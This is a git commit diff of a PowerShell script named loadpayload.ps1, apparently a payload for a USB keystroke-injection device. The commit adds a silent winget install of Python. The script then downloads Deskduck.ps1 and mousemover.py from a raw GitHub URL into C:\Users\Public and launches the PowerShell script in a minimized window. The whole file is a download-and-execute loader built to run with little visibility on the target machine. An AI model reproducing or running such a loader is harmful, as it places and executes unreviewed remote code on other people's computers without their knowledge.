5b3528ca90b492adc9dcdfe2c03b7d666ea2ca56
jackalopealope <146662223+jackalopealope@users.noreply.github.com>
2024-02-05 12:51:32 -0700

    Update loadpayload.ps1

--- loadpayload.ps1
+++ loadpayload.ps1
@@ -1,3 +1,4 @@
+winget install -e --id Python.Python.3.11
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jackalopealope/MyPicoArchive/main/Deskduck.ps1" -OutFile "C:\Users\Public\Deskduck.ps1"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jackalopealope/MyPicoArchive/main/mousemover.py" -OutFile "C:\Users\Public\mousemover.py"
 Start-Process powershell -ArgumentList "C:\Users\Public\Deskduck.ps1" -WindowStyle Minimized
